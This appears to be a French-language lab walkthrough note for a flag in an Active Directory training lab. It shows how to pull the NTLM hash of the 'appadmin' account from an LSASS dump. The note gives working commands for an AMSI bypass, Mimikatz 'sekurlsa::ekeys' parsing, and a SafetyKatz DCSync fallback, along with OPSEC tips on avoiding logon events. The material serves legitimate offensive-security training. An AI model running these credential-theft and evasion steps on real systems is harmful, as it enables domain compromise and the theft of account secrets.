---
flag: 15
machine: dcorp-adminsrv
statut: à faire
technique: LSASS dump
LO: "[[LO07 - Session DA et escalade]]"
---
# F15 · NTLM de appadmin

> [!summary] Objectif
> Récupérer le hash NTLM du compte `appadmin` depuis LSASS de `dcorp-adminsrv`.

## Contexte
- **Étape attack flow** : troisième compte tiré du même dump que F13/F14 sur `dcorp-adminsrv`.
- **Ce qu'on a** : TGT `svcadmin` (DA) → PSSession admin sur `dcorp-adminsrv`, dump LSASS déjà rapatrié.
- **Ce qu'on cherche** : bloc `appadmin` dans mimikatz `ekeys` (compte applicatif souvent en session sur adminsrv).

## Solution

### Étape 1 : réutiliser le dump de F13/F14
Un seul `sekurlsa::minidump` liste tous les blocs — pas besoin de redumper.

### Étape 2 : parse ciblé
```powershell
iex (Get-Content C:\AD\Tools\Amsi-Byp.txt -Raw)
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"sekurlsa::minidump C:\AD\Tools\lsass-adminsrv.dmp" "sekurlsa::ekeys"' |
  Select-String -Pattern 'appadmin' -Context 0,20
```
→ dans le bloc `Username : appadmin`, ligne `rc4_hmac_nt` = NTLM.

### Étape 3 : plan B — DCSync (si `appadmin` absent de LSASS)
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dollarcorp\appadmin" "exit"
```
→ Voir [[Cheatsheet - Persistence]] (nécessite DA / droits de réplication, obtenus après F16/F17).

## Réponse

| Élément | Valeur |
|---------|--------|
| appadmin NTLM | A REMPLIR DEPUIS LAB |

## Pièges et OPSEC
- Confusion classique : `appadmin` (domaine, sur adminsrv) vs `mgmtadmin` (admin **local** de dcorp-mgmt) — vérifier appartenance avec `Get-DomainUser appadmin`.
- Trier `ekeys` sur le **type de compte** : ignorer machine (`$` en suffixe) et locaux, garder domaine.
- Dump refait → nouveau 4624 sur adminsrv. Préférer réutiliser le `.dmp` existant.

## Refs
- [[Cheatsheet - Post-exploitation]]
- [[Cheatsheet - Persistence]]
- [[LO07 - Session DA et escalade]]
- [[F13 - NTLM-clair de srvadmin]]

[[Flags - Index]] · [[Journal - Index]]
